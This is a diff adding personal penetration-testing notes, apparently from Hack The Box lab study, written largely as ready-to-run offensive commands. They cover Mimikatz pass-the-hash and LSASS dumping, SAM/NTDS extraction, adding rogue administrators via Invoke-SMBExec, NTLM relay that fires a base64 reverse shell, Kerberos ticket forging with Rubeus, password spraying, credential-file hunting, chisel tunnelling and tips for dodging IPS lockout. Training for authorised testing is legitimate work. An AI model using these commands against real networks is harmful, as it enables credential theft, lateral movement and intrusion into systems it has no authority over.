@@ -1,0 +1,2816 @@
+nc -nlvp 127.0.0.1 9999 -e /bin/bash/
+
+maybe use a different computer on seperate network to acquire DNS resolved IPs
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Essential characteristics of documentation are:
+	1.Overview
+	2.Scructure
+	3.Clarity
+
+USE CHERRYTREE FOR POST NOTE TAKING
+USE FLAMESHOT TO TAKE PICS ALONG JOB
+THEN USE CHERRY TREE TO CONCULDE JOB
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+I. INFOGAH<>VULNASS
+	A. Consider custom blue text for reference???
+		1.) Use at least TWO machines with difference source addresses in order to dodge IPS lockout
+			-consider -D RND:3 decoy scan to try to gather data on its effectivness
+			-https://nmap.org/book/host-discovery-strategies.htmli
+
+		2.) sudo nmap --script-updatedb
+			-updates NSE for nmap
+
+		3.) Utilize PACKET ANALYZER before connecting to a link to a website. This could lead to diagnosing why the connection isn't happening.
+
+	B. Services?
+		1.)tool	nc -nv [IP] [port]	should give version if nmap fails; might be intrusive
+
+		2.)If SMB or FTP is found, go to section VI
+
+		3.) Open/closed?
+
+	C. What to do with data
+		1. If dealing with a web server port i.e. 80/443:
+			-tool curl -I [host]:[port]
+				.only gives headers; looking for service version!
+			-Move to II
+	D. Look up possible exploits on msfconsole and searchsploit. 
+		1. If found, move to III.
+
+			search for exploits with info like OS or service or both
+
+			what to do with datrc=javascript: depends on what
+	
+	E. Windows AD and PtH
+				-Bloodhound:
+					.See 'bloodhound' directory in Windows Scripts
+		1.)PtH(Pass the Hash)
+				-Mimikatz ---> module ---> sekurlsa::pth
+					.Requires the following:
+						/user
+						/rc4 or /NTLM hash of pwd
+						/domain <--- which domain the user belongs to
+							.If local: can use computer name, localhost, or dot (.)
+						/run ---> program we want to run with the user
+							.default is cmd.exe
+
+					From WinRm session:
+					-------------------
+					.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit	<---or any other mimi commands
+
+					.Syntax:
+					--------
+					mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B 
+					/domain:inlanefreight.htb /run:cmd.exe" exit
+
+					.Stores Hash in memory
+					.sekurlsa::logonpasswords ---> mimi command that dumps hashes for current sessions
+
+				-Invoke-TheHash ---> https://github.com/Kevin-Robertson/Invoke-TheHash
+					.Requires:
+						Target 		---> hostname or IP
+						username	---> Must have admin privs
+						Domain		---> Not necessary with local accounts
+						Hash		---> NTLM hash needed for auth
+						Command		---> If not specified, the function will check if user can access WMI
+					.Must be imported ---> Import-Module .\Invoke-TheHash ---> Try to load into memory with IEX
+
+					.Syntax for adding new user to admin group locally(net command):
+					----------------------------------------------------------------
+					Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio 
+					-Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add 
+					&& net localgroup administrators mark /add" -Verbose
+
+					Invoke-WMIExec for using WMI to execute command
+					Type 'powershell -e' to see how to execute base64 encoded command in CLI
+
+				-Impacket-psexec
+
+					.Syntax:
+					--------
+					impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+						.establishes a shell on target
+						.if in domain, then 'impacket-psexec domain/user:password@IP'
+					impacket-wmiexec
+						.Generates fewer logs -> event ID 4688: A new process has been created; happens for EACH command!
+						.Stealthier approach to gaining remote access; but can still trip AV and EDR
+					impacket-atexec
+					impacket-smbexec
+
+					.Cleanup:
+					---------
+					Delete services with:
+
+					services.py username:password@targetHost stop -name TZZW
+					services.py username:password@targetHost delete -name TZZW
+					services.py FQDN/user@target_FQDN -k -no-pass list
+
+				-CrackMapExec ---> POST-exploitation tool
+
+					.Syntax:
+					--------
+					crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
+						.-x ---> command to execute
+
+					crackmapexec smb [IP] -u [user] -p 'pass' -x 'command' --exec-method smbexec
+						--exec-method will default to atexec method. Specify smbexec if that fails
+
+					crackmapexec smb [IP]/mask -u [user] -p 'pass' --loggedon-users
+						enumerates all ips within subnet
+
+
+				-Evil-Winrm ---> if WinRM ports are open; searh 'winrm'
+					.Syntax:
+					--------
+					evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+						.If a domain account is used, must include domain name as such: admin@inlanefreight.htb
+
+				-xfreerdp ---> Can be used if 'Restricted Admin Mode' is NOT enabled. If it is, and CLI is accessible, then:
+					.reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+					.then:
+					------
+					xfreerdp /pth:NTLM_Hash /u:user /v:IP
+
+				-UAC registry keys to enum:
+					.If Admin AND in Local group on machine AND ! RID 500 ---> check LocalAccountTokenFilterPolicy
+					.If Admin AND RID 500 on machine ---> Check FilterAdministratorToken
+					.ONLY applies to local account users;
+						.if user is apart of local administrative group, then will connect with MEDIUM UAC
+						.If said user is rid 500, then UAC is effectively 0, UNLESS FilterAdministratorToken = 0x1
+					.IF domain user, then the below key values are moot. Even if apart of local admin group.
+						.NO UAC; full admin potential
+					.Search 'Schroeder' for more details
+					.HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
+						---> disabled by default; 0x0
+						--->if 0x0, then RID-500(Local admin) is the only one who can perform admin tasks i.e. pass-the-hash
+						--->if 0x1, then OTHER local admins can perform these tasks as well
+					.An EXCEPTION is: 
+						--->FilterAdministratorToken 0x1
+							.RID 500 is enrolled in UAC protection ---> PtH will fail when using that account locally.
+							.An error 'Access Denied' Will show up in terminal.
+						--->HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken
+								
+		2.) Ticket Dump
+				Mimikatz ---> requires admin privs to get other users tickets
+					.file stored as *.kirbi
+
+					.File Syntax:
+					-------------
+					[randomvalue]-username@service-domain.local.kirbi ---> if computer account than username has '$' at the end
+
+					.Command Syntax:
+					----------------
+					.\mimikatz.exe 
+					sekurlsa::tickets /export
+
+					.Version 2.2.0 20220919 'sekurlsa::ekeys' presents hashes in des_cbc_md4 on some windows 10 version
+						.sekurlsa::tickets /export does NOT work right because encryption is wrong. 
+						.Hashes MAY be used to generate NEW tickets or use Rubeus to export in base64
+						.see Pass the Key or OverPass the Hash
+
+				Rubeus ---> can dump tickets if local admin
+					
+					.Command Syntax:
+					----------------
+					Rubeus.exe dump /nowrap ---> no wrap allows for easier copy/pasting
+
+		3.)PtK/OPtH	Pass the Key/Over-Pass the Hash ---> ticket loaded into memory using following commands
+				Windows server 2008/2012 with or w/o R2 more than likely REQUIRE AES keys in order to prevent 'encryption downgrade'.
+					.dumping tickets shows encryption used to avoid this
+					.Members of "Protected Users" group can ONLY user AES keys; NO NTLM, DES, or RC4
+				Mimikatz ---> requires admin privs. Here the rc4, and aes keys are dumped. They're used to forge tickets in next step
+
+					.Generates new command window with loaded TGT; can request TGSs
+
+					.Command Syntax:
+					----------------
+					sekurlsa::ekeys ---> can use keys with Rubeus version of PtK/OPtH
+						.see PtH for mimikatz to get ntlm hash for following step
+					sekurlsa::pth /domain:  /user:   /ntlm:
+					.TGT stored in memory
+					.Can now access services as that user(assuming that user is on the ACL)
+
+				Rubeus ---> does NOT require admin privs!!Takes key from mimikatz in order to forge TGT:
+
+				 	.Command Syntax:
+					----------------
+					Rubeus.exe  asktgt /domain: /user: /aes256:
+
+					IF ticket is applied to CURRENT logon session, perform the following.
+
+					.Command Syntax:
+					----------------
+					Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
+						.to create a sacraficial process/logon session through LSASS.exe
+						.should create a new cmd.exe window with imported ticket
+					Rubeus.exe ptt /ticket:"file.kirbi" /luid:0xa ---> with newly created process LUID
+						.imports desired ticket into luid if you want to change it
+
+		4.)PtT		Pass the Ticket ---> imports acquired tickets
+				Rubeus ---> use the /ptt flag (pass the ticket)
+				In order to eliminate using mimikatz, the NTLM hash must be cracked in order to acquire keys via Rubeus.
+					
+					.Command Syntax for keys with Rubeus:
+					-------------------------------------
+					Rubeus.exe hash /password:plaintext_pwd /user:username /domain:full_domain
+
+					.Command Syntax with key encrypted pwd:
+					---------------------------------------
+					Rubeus.exe asktgt /domain: /user: /rc4: /ptt
+
+					.Command Syntax with kirbi file from mimi:
+					------------------------------------------
+					Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+
+					.Command Syntax using base64 encoded kirbi or output:
+					-----------------------------------------------------
+					[Convert]::ToBase64String([IO.File]::ReadAllBytes("*.kirbi"))
+					Use prior command with the base64 string instead
+						-replace brackets with single quotes
+
+					.Command Syntax for using Powershell Remoting:
+					----------------------------------------------
+					Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show ---> like 'runas' command; opens cmd.exe;
+						.does this without erasing existing TGTs for current logon session
+					Rubeus.exe asktgt /domain: /user: /rc4: /ptt ---> rc4 might need to be AES
+						.see #122 in resources; or PasswordAttacks/Windows notes
+	
+				Mimikatz ---> using *.kirbi file
+
+					.Command Syntax:
+					----------------
+					.\mimikatz.exe 
+					kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[randomvalue]-username@service-domain.local.kirbi"
+					misc::cmd ---> Upon PtT command execution, a new command prompt window will launch with the imported ticket
+
+					.Command Syntax for PS remoting:
+					--------------------------------
+					Enter-PSSession -ComputerName DC01 ---> from terminal with admin privs, Remote Management Users, or correct setting
+						.See PasswordAttacks/Windows
+					Enter-PSSession -ComputerName DC01 -Credential $Creds
+						-$SecPassword=ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+						-$Creds=New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)
+
+		5.) MSSQL	PtH
+				---
+					Start responder or impacket-smbserver
+					sudo responder -I interface
+					sudo impacket-smbserver -smb2support share ./ 
+
+					Execute one of the following commands/procedures:
+					-------------------------------------------------
+					EXEC master..xp_dirtree '\\10.10.110.17\share\'
+					GO
+
+					EXEC master..xp_subdirs '\\10.10.110.17\share\'
+					GO
+
+				Impersonate
+				-----------
+					Sysadmins impersonate ANYONE;
+					
+					Use this query to ID users who CAN impersonate:
+					-----------------------------------------------
+					SELECT distinct b.name
+					FROM sys.server_permissions a
+					INNER JOIN sys.server_principals b
+					ON a.grantor_principal_id = b.principal_id
+					WHERE a.permission_name = 'IMPERSONATE'
+					GO
+					
+					Verify if CURRENT USER has Sysadmin role:
+					-----------------------------------------
+					SELECT SYSTEM_USER
+					SELECT IS_SRVROLEMEMBER('sysadmin')
+					go
+
+					0 indicates no/inactive
+					1 indicates yes/active
+
+					Impersonate the SA user:
+					------------------------
+					Move to master database with ---> USE master
+					EXECUTE AS LOGIN = 'sa'
+					SELECT SYSTEM_USER
+					SELECT IS_SRVROLEMEMBER('sysadmin')
+					GO
+
+					Return to previous user:
+					------------------------
+					REVERT
+
+	F. Password Crackers / Wordlists
+		1.) cewl			scout website directory, creating custom wordlist for a password cracker
+							-might need to exclude port number if no words are being written
+							-option		-d	depth of file(default 2)
+							-option		-w	write to file
+							-option		-m	minimum letters(default 3)
+							-option		--with-numbers		accepts words with numbers
+
+		2.) Hydra and medusa		online password cracker
+							-hydra -l user -P password-list service-protocol://host:port
+							-service-protocol=ftp, smb, etc
+							-medusa -u user -P wordlist -h IP -M protocol
+								.-U for user list
+
+		3.) frackzip			fcrackzip for zip files
+
+		4.) crowbar			able to brute list of ssh keys against ssh servers
+
+		5.) pfx2john			pfx2john to extract hash from .pfx file; write to file
+							then use john -w=wordlist_path hash.file
+							Above works with pfx file
+							See 'openssl' for info on extracting certs and keys
+
+		6.) For more:			Go to /Hashcat/Cracking_Pass*
+		 
+		7.)IF PWD and USER found, go to III
+	
+	G. Windows Cred Gathering		See 'Password_Attacks/Windows_Section/Windows_Password_System.txt' for more details
+		1.) Finding Users		Scrape Company website for users; compile a list
+						Kerberos User Enum via MSFconsole
+						If a foothold is established,
+							-net users <--- shows other user accounts on local machine
+							-look in 'Users' location <--- Note user folders
+							-wmic useraccount get sid,name
+							-Powerview.ps1 <--- many commands for an AD environment; 
+								.Get-DomainUsers
+
+		2.) Getting Password		Hydra works for:
+							-SMB
+								.OR Metasploit Framework: auxiliary/scanner/smb/smb_login
+							-RDP
+							-SSH
+							-FTP
+						CrackMapExec works for most windows services/protocols
+							 crackmapexec smb IP -u username/list -p passlist 
+								-may require --local-auth if using plaintext or if linux Samba
+						If user and password on target machine is known, then remote dumping can be performed:
+							-crackmapexec smb IP --local-auth -u user -p password --lsa
+							-crackmapexec smb IP --local-auth -u user -p password --sam
+						If user and password on target AD machine is known, try dumping ntds file:
+							-crackmapexec smb IP -u user -p password --ntds <--- may require --local-auth
+
+		3.) Password Dumps		Requires Admin privs
+						See 'Password_Attacks/Windows_Section' for more details on dump techniques while in foothold
+							-SAM located in C:\Windows\System32\config\SAM
+							-NTDS.dit located in C:\Windows\NTDS
+						.dmp files require mimikatz or pypykatz <--- former located in ../Enumeration_Scripts/Windows/Mimi
+						Remote dumping
+							-crackmapexec smb IP -u user -p pass --[ntds,SAM,lsa]
+						Local dumping(Be AWARE of AV!!)
+							-SAM	---> reg.exe save hklm\sam|system|security C:\sam|system|security.save <--- must save at \
+								---> Use impacket-secretsdump 
+	
+							-LSASS	---> Get-Process -name lsass*
+								---> rundll32 C:\windows\system32\comsvcs.dll, minidump 672 C:\lsass.dmp full
+								---> Use pypykatz lsa minidump /pathto/lsass.dmp
+
+							-AD	---> vssadmin CREATE SHADOW /For=C:
+								---> Use below one liner to copy VSS to desired location
+						        cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit 
+							c:\NTDS\NTDS.dit
+								---> Use impacket-secretsdump << MUST HAVE BOOT KEY(system.save)
+
+		4.) Cred Stuffing		For default credentials for various applications:
+						~/Documents/Scripts/PWD_cracking/creds_defaults
+						Syntax:
+							-python3 creds search [application-no-brackets]
+						Examples:
+							admin:admin
+							admin:password
+							admin:<blank>
+							root:12345678
+							administrator:Password
+
+		5.) Naming Conventions		Username-Anarchy
+							-Takes a list of names found from OSINT; combines in various formats that match common
+							 company naming conventions i.e. usernames used to log in
+						Location:
+							~/Documents/Scripts/PWD_cracking/username-anarchy
+						Syntax:
+							./username-anarchy -i name_list.txt > outputfile.txt
+
+		6.) App Scraping		Below is a tool that can be used to retrieve passwords from applications locally on the target machine
+						laZagne.exe <--- ~/Documents/Scripts/PWD_cracking/LaZagne
+						Syntax in CLI:
+							-start lazagne.exe all
+							-vv for verbose
+
+		7.) findstr			windows executable native to OS PS and CMD that searches for strings inside files
+						list of parameters:
+							https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr
+							findstr [/b] [/e] [/l | /r] [/s] [/i] [/x] [/v] [/n] [/m] [/o] [/p] [/f:<file>] [/c:<string>]
+							[/g:<file>] [/d:<dirlist>] [/a:<colorattribute>] [/off[line]] <strings> [<drive>:]
+							[<path>]<filename>[ ...]
+						Syntax for finding string in a file:
+							-findstr.exe string file
+							-findstr.exe /c:"string" *.txt
+							-findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+								.searches for files matching extentions in the current directory and child objects(s),
+								 ignoring case of characters(i), and print only file name containing string(m).
+
+		8.) Other places to search	Passwords in:		
+							-Group Policy in SYSVOL share
+							-Scripts in SYSVOL share
+							-Scripts in IT shares
+							-web.config files,php files, html files in wwwroot
+								.on dev machines and IT shares
+							-unattended.xml
+							-AD user or computer description fields(PowerView.ps1 for below commands)
+								.Get-netusers
+								.Get-netcomputers
+								.Get-ADUsers
+								.Get-ADComputers
+							-KeePass Databases ---> pull hash, crack, get access
+							-Other drives/shares
+							-pass.txt, passwords.docx, passwords.xlsx on user systems, shares, Sharepoint.
+
+		9.) GPO Default Domain Policy	Get-ADDefaultDomainPasswordPolicy
+						net accounts
+
+		10.) Dir			dir /? ---> cmd line command for dir help
+						dir n:\*creds* /s /b
+
+		11.) Responder			Capturing Hashes from NetNTLMv1/v2
+						Requires an interface
+						Uses windows protocols to listen for IP queries when a share is being located
+						Hashes captured saved in logs 
+							-/usr/share/responder/logs
+							-Hashcat mode 5600
+
+						Syntax:
+						-------
+
+						sudo responder -I interface
+						create a NC listener
+
+		12.) Relay Attack		Perform ALL steps consequtively:
+						--------------------------------
+						set SMB to off in /etc/responder/Responder.conf
+						impacket-ntlmrelayx --no-http-server -smb2support -t [IP]
+						impacket-ntlmrelayx --no-http-server -smb2support -t [IP] -c 'powershell -e base64string'
+							-where the base64string is a reverse shell
+							-executed once victims hash is returned to us
+
+		13.) MS 365			Hydra doesn't typically work with 365 cloud servers.
+
+						MS Office 365 User enum tools:
+						------------------------------
+						o365spray ---> see SMTP section
+						MailSniper --> Require foothold I believe. ~Documents/Scripts/Enumeration_Scripts/SMTP_Scripts/MailSniper
+						
+
+	H. Linux Cred Gathering			
+		1.) All conf extentions		The following one liner searches for all common config file extentions; excludes lib, fonts, share, and 
+						core directories
+							for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; 
+							find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+						
+		2.) Find user/pass files	The following searches for files ending in 'cnf', excludes doc and lib, and displays lines within the file 						    that may include 'password, user, or pass'. The final grep may remove default configurations.
+							for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");
+							do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
+
+		3.) Databases			The following searches for database file types, excluding doc, lib, headers, share, and man.
+							for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; 
+							find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
+
+		4.) Notes			Searches for files with 'txt' extentions, and those without any extention
+							find /home/* -type f -name "*.txt" -o ! -name "*.*"
+
+		5.) Scripts & Binaries		Searches for script extentions. Omits lib, doc, headers, share.
+							for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; 
+							find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+
+						Binaries
+							find / -perm -4000 2> /dev/null
+
+		6.) Cronjobs			ll -a /etc/cron.*
+						Check local machines for a baseline of cronjob files
+
+		7.) SSH				grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1" ---> searches for private key files
+						grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"	---> searches for public key files
+
+		8.) Bash history		Contains commands entered in terminal.
+						'bashrc' may contain information such as scripts and hidden directories
+
+		9.) Logs			For various log files and their general purpose, see;
+							Password_Attacks/Linux_Section/Log_File_Descriptions_Linux.png
+						For LONG one liner to search in log files for interesting strings, see
+							-/home/ShiguruiMuerto/Documents/Scripts/Enumeration_Scripts/Linux_File_Search
+							
+		10.) Memory Dump		mimipenguin <--- similar to mimikatz; REQUIRES ROOT!
+							-/Scripts/Enumeration_Scripts/Memory_Dumps
+							-does NOT work on all distros. See README.
+						laZagne.py
+							-requires python2.7 <--- sudo python2.7 lazagne.py all
+
+		11.) Web Browser		mozilla stores passwords in ~/.mozilla/firefox/*default*/logins.json
+							-may be > 1 'default' directory
+							-usernames and passwords are hashed/encrypted
+						Firefox Decrypt ---> extracts passwords from profiles(json file). Web browser supported:
+							-Mozilla (Fire/Water)fox™
+							-Thunderbird® 
+							-SeaMonkey® 
+							-and derivates
+						Python 3.9 is required as of 1.0.0
+						LaZagne can be used here as well:
+							-python3 laZagne.py browsers
+
+		12.) My Pictures		/home/ShiguruiMuerto/Documents/HTB_Pentesting/Password_Attacks/Linux_Section/
+						Passwords_and_Hashes_sources_Linux.png
+
+	I. Linux Encrypted File Search		for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");
+						do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core";
+						done					
+
+						grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
+						cat the keys found to see which encryption is in use
+
+		1.) Cracking Files		locate *2john* ---> lists all john derivatives
+						
+						For SSH:
+							-ssh2john.py ssh.ENCprivateKEY > ssh.hash
+							-john --wordlist=rockyou.txt ssh.hash
+							-john ssh.hash --show ---> shows the password associated with that file
+
+						For common office documents:
+							-office2john.py doc > doc.hash
+							-same as above
+
+						For PDFs:
+							-pdf2john.py pdf.pdf > pdf.hash
+							-same as above
+
+						For kirbi files:
+							kirbi2john.py file.kirbi > file.hash
+
+							May need to change the file.hash in order to get hashcat format:
+							----------------------------------------------------------------
+							sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' file.hash > file.hash.hashcat
+
+		2.) Cracking Archives		curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\."
+						| tee -a compressed_ext.txt
+							-Creates a list of archive file extentions
+
+						For zip files:
+							-zip2john
+
+						For OpenSSL encrypted files:
+							-A for loop using the openssl tool is needed because of the potential for false positives
+							for i in $(cat rockyou.txt); do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null 
+							| tar xz;done
+
+						For Bitlocker:
+							sudo dd if=/dev/disk2 of=/path/to/imageEncrypted conv=noerror,sync
+								-extracts the image of the drive; if=infile, of=outfile
+							bitlocker2john -i backup.vhd > backup.hashes
+							grep "bitlocker\$0" backup.hashes > back.hash
+							hashcat mode 22100
+							More detailed steps here ---> https://openwall.info/wiki/john/OpenCL-BitLocker
+
+
+	J. Linux and AD
+		1.) Commands to enum		The following will determine if the linux machine is domain joined:
+						-------------------------------------------------------------------
+						realm list
+							-shows groups allowed to connect
+								.format: domain users@domain.tld
+						ps -ef | grep -i "winbind\|sssd"
+							-check these processes in order to determine if possibly connected to AD environment
+						id ---> may show "(domain users)" in gid field
+						cat /etc/nsswitch.conf | grep -i "sss\|winbind\|ldap"
+						cat /etc/pam.d/system-auth  | grep -i "pam_sss.so\|pam_winbind.so\|pam_ldap.so"
+
+						
+		2.) Looking for tickets		find / -name *keytab* -ls 2>\dev\null 
+							-Finds keytab files ---> many files may not be related to kerberos
+						crontab -l ---> looks for user cronjobs that may have scripts with interesting content
+						Default keytab file:
+							-/etc/krb5.keytab
+						KRB5CCNAME
+							-env variable holding ticket info after authenticating via DC/KRB
+						env | grep -i krb5
+							-may show above env variable
+						look for CCACHE files in /tmp
+
+		3.) Reading Tickets		klist -k -t
+							-shows some info in keytab files
+						klist
+							-simply lists current ticket in use w/ info
+
+		4.) Impersonating		save copy of ccache file in KRB5CCNAME
+							-export KRB5CCNAME=/path/to/krb5ccachefile
+						kinit ---> case sensitive
+						kinit user@domain.tld -k -t /path-to/file.keytab
+
+		5.) Access SMB via KRB		smbclient //dc01/carlos -k -c ls
+
+		6.) KeyTabExtract		/home/ShiguruiMuerto/Documents/Scripts/Enumeration_Scripts/Linux_Joined_ActiveD
+							-extracts hashes from 502 type keytab files
+
+		7.) Enum ccache files		usually located in /tmp
+						ls -la /tmp
+						id user@domain.tld ---> enumerates groups user is associated within AD domain
+
+		8.) Accessing DC(Impacket)	Configure /etc/hosts to resolve DC domain name to its IP
+						Configure Proxychains to socks5 127.0.0.1 1080
+						Initialize chisel on attack host:
+							-./chisel server --reverse
+						Move 'chisel' onto target foothold
+							-c:\chisel.exe client [your IP]:8080 R:socks
+						Move target user's ccache file to attack host
+							-export KRB5CCNAME=/pathto/krb5ccfile
+							-may need to use FILE: prefix
+						Impacket
+							-proxychains impacket-wmiexec [foothold NAME] -k
+								.use -no-pass if prompted for password
+								.must use name, NOT IP!
+
+		9.) Accessing DC(EvilWinRm)	sudo apt-get install krb5-user -y
+						The following is CASE sensitive
+
+						Configure /etc/krb5.conf:
+						-------------------------
+							[libdefaults]
+								default_realm = INLANEFREIGHT.HTB
+
+							<SNIP>
+
+							[realms]
+							    INLANEFREIGHT.HTB = {
+								kdc = dc01.inlanefreight.htb
+							    }
+
+						proxychains evil-winrm -i [targetDC] -r [krb realm]
+	
+		10.) Converting .kirbi 		impacket-ticketConverter [input file] [output file]
+							-*.kirbi <--- windows
+							-ccache <--- linux
+
+		11.) Linikatz			Requires root
+						./linikatz.sh
+							-/home/ShiguruiMuerto/Documents/Scripts/Enumeration_Scripts/Linux_Joined_ActiveD
+							-outputs contents in a folder
+
+	K. APIs					/proc/self/environ
+							-If given access to remote code execution, this file can help determine enviroment processes 
+							 running and their locations
+
+	L. InfoGah for INTERNAL AD Network	The GOAL is to gather IPs/usernames to enumerate
+						Acquire SYSTEM control which will make the following easier to perform
+
+		1.) Listening/Packet Captures	Searching for other hosts
+						For windows ---> pktmon.exe
+						Linux	    ---> tcpdump
+
+						Responder(linux):
+						-----------------
+						sudo responder -I [interface] -A	<--- A is to listen without responding
+
+		2.) BlackBox User Enum		Kerbrute(Windows and linux):
+						----------------------------
+						sudo git clone https://github.com/ropnop/kerbrute.git
+						make help <--- determine which architecture/OS to make
+						Wordlists ---> https://github.com/insidetrust/statistically-likely-usernames
+
+						LLMNR/NBT-SN Poison w/ Responder and Inveigh:
+						---------------------------------------------
+						Responder writes captured hashes in /usr/share/responder/logs
+
+						Inveigh:
+						--------
+						Import-Module ./Inveigh.ps1
+						Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y <---ps1
+						The C# variant must be compiled with options preset.
+
+						User list building:
+						-------------------
+						enum4linux -U [IP]
+						rpcclient -U "" -N [IP]
+							-getdompwinfo
+						crackmapexec smb [IP] --users <--- may need to pass credentials
+						ldapsearch -h [IP] -x -b "DC=,DC=" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+						./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+
+						STEALTH user list gathering:
+						----------------------------
+						kerbrute userenum -d inlanefreight.local --dc [IP] username.list
+							-Does NOT create event ID 4625(failed logon)
+							-WILL generate event ID 4768: TGT requested <--- only if Kerberos event logging enabled via GPO.
+
+		3.) Password Spraying		High Value Targets: Microsoft Exchange + SQL
+
+						Acquire the password policy remotely:
+						-------------------------------------
+						crackmapexec smb 172.16.5.5 -u [user] -p [pass] --pass-pol
+						rpcclient -U "" -N [IP]
+							-getdompwinfo
+						enum4linux -P [IP]
+						enum4linux-ng -P [IP] -oA [file]
+						ldapsearch -h [IP] -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 [filename]
+							-proxychains doesn't work well with this
+
+						Acquiring PW policy from Windows:
+						---------------------------------
+						net accounts
+						net accounts /domain
+						Powerview command 'Get-DomainPolicy'
+						Get-ADDefaultDomainPasswordPolicy
+
+						Password Spraying commands:
+						---------------------------
+						Scripts in /home/ShiguruiMuerto/Documents/Scripts/PWD_cracking/PasswordSpraying
+						kerbrute passwordspray -d [domain.local] --dc [IP] users.list password_to_use_against_list
+						sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+
+						Password Spraying Admin for ubiquitous local Admin paords:
+						-------------------------------------------------------------
+						crackmapexec smb --local-auth [IP]/mask -u administrator -H [hash] | grep +
+
+						Password Spraying from Windows:
+						-------------------------------
+						Import-Module .\DomainPasswordSpray.ps1
+						Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+
+		4.) Enum with Creds(Linux)	(Pwn3d!) indicates that user is Admin
+						smbmap -u [user] -p [pass] -d domain.local -H [IP] <--- shows permissions over contents
+						sudo crackmapexec smb [IP_of_DC] -u [user] -p [pass] --users | tee -a file.txt
+							-Note bad password count
+							-can also do '--computers'
+						sudo crackmapexec smb [IP_of_DC] -u [user] -p [pass] --groups | tee -a file.txt
+						sudo crackmapexec smb [IP] -u [user] -p [pass] --loggedon-users | tee -a file.txt
+						sudo crackmapexec smb [IP] -u [user] -p [pass] --shares | tee -a file.txt
+							-checks Shares available at target IP 
+						sudo crackmapexec smb [IP] -u [user] -p [pass] -M spider_plus --share 'Share_name' | tee -a file.txt
+							-saves json output in /tmp
+
+
+						Enumerating Shares + files(contents as well) with smbmap:
+						---------------------------------------------------------
+						smbget -R smb://fileserver/directory <---downloads ALL files; quick			
+						grep -ri "user\|password\|pass" *     <---checks ALL files RECURSIVELY for words in quotes
+						for i in $(ll -ox); do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null; done
+
+						Searching for Domain Admins via LDAP:
+						-------------------------------------
+						windapsearch.py --dc-ip IP_DC -u user@domain.local -p [pass] --da
+							-Use the '-PU' flag to find users within nested groups; inherited permissions
+
+						ldapsearch -x -H ldap://IP -b "DC=,DC=" -x -D "domain\user" -W "(ServicePrincipalName=*)" 
+						"(&(objectClass=user)) (!userAccountControl:1.2.840.113556.1.4.803:=32)"
+							-Shows users with a SPN that are ENABLED
+
+		5.) Enum with Creds(Win)	Useful cmdlets from ActiveDirectory powershell module:
+						------------------------------------------------------
+						Get-commands -module activedirectory
+						Get-ADDomain <---Domain Linked GPOs and other domain details
+						Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName 
+							-If SPN NOT NULL then may be vulnerable to kerbroasting
